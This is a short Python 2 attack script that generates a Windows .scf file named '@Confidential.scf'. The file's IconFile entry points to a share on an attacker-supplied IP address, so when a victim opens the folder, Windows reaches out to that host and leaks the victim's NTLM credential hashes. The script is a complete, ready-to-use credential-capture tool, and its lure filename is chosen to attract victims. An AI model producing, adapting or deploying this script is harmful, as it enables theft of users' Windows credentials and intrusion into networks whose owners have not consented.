#!/usr/bin/python

import string, random, sys

charset = str(string.lowercase) + str(string.digits)
icon_filename = ""

for i in range (0, 6):
	icon_filename += str(charset[random.randint(1,35)])

icon_filename += ".ico"
scf_filename = "@Confidential.scf"

if len(sys.argv) > 1:
	attacker_ip_addr = str(sys.argv[1])
else:
	print "[+] Run the script as python <SCRIPT_NAME> <IP_ADDRESS>"
	sys.exit(1)

payload = "IconFile=\\\\"+str(attacker_ip_addr).strip()+"\\share\\"+str(icon_filename).strip()+"\r\n"

scf_file = open(scf_filename, "w")
scf_file.write("[SHELL]\r\n")
scf_file.write("Command=2\r\n")
scf_file.write(payload)
scf_file.write("[Taskbar]\r\n")
scf_file.write("Command=ToggleDesktop\r\n")
scf_file.close()

print "[+] SCF File written (" + str(icon_filename) + ")."
